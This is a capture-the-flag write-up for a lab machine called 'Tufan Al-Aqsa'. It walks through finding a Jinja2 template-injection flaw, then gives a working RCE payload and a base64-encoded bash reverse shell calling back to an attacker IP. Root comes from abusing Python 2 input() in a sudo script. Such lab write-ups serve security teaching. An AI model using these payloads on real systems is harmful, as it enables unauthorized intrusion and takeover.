# ****Tufan Al-Aqsa**** 🇵🇸

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled.png)

IP: 10.0.0.133

# Enumeration
We start by scanning the machine with nmap.

Discover all open ports:

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%201.png)

Check what is exactly running on these ports:

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%202.png)

# Foothold

There is python web application running on port 80.

Visiting it we get:

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%203.png)

If we try to inspect the source code, surprisingly we cant!

Trying to check robots.txt file

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%204.png)

We get this error page, and we notice that the file name is displayed in the error message.

Since it is a python web server it may be vulnerable to SSTI.

So to check we try the famous `{{7*7}}` SSTI payload.

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%205.png)

As we can see it returned 49 which proves that it is vulnerable.

So we now try to find a [payload](https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/) that can lead to RCE and then get a reverse shell.

```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%206.png)

We have successfully run `id` command.

**For reverse shell:**

First we set up a listener:

```bash
nc -nvlp 1234
```

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%207.png)

Then we get a reverse shell payload: (you can use https://www.revshells.com/ to generate one)

```bash
/bin/bash -i >& /dev/tcp/10.0.0.132/1234 0>&1
```

Encode it with bsae64

```bash
echo '/bin/bash -i >& /dev/tcp/10.0.0.132/1234 0>&1' | base64 
```

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%208.png)

```bash
L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xMzIvMTIzNCAwPiYxCg==
```

This will echo the command, decode it and run it. This way we wont face any problems running commands.

```bash
http://10.0.0.133/{{request.application.__globals__.__builtins__.__import__('os').popen('echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjAuMC4xMzIvMTIzNCAwPiYxCg== | base64 -d | bash').read()}}
```

And we get the reverse shell

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%209.png)

We can find the user.txt flag inside the home directory for the user zoznoor23. 🇵🇸

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2010.png)

# Privilege Escalation
Running `sudo -l` to check what the user zoznoor23 can run using sudo.

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2011.png)

So the user zoznoor23 can run python2 on /opt/i_dont_trust_sudo.py as root.
Let us try running it:

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2013.png)

It asks for a password, but we do not have any.

Let us read the file to understand how it works, or to get a clue about what the password is.

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2012.png)

So bsically the code reads a password form /root/password.txt, and check if our input matches the password, then it will run /bin/bash giving us a shell as root.

Since we did not found any clue, we should look somewhere else.

What is interesting here is that it is using python 2, whihle python3 exists on the machine which is weried.

Searching for python 2 vulnerabilities we find that the input() function in python2 is  vulnerable.

The vulnerability in input() method lies in the fact that the variable accessing the value of input can be accessed by anyone just by using the name of the variable or method. Below are some vulnerability in input() method:
- Variable name as input parameter
- Function name as parameter

[Read about the vulnerability.](https://www.geeksforgeeks.org/vulnerability-input-function-python-2-x/)


So in our case we just need to provide `secure_password` as our input, and we now we got a shell as root.

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2014.png)

Now we can go to the home directory for the root user and read root.txt flag.

![Untitled](/assets/img/machinesCTF/Tufan-Al-Aqsa/Untitled%2015.png)
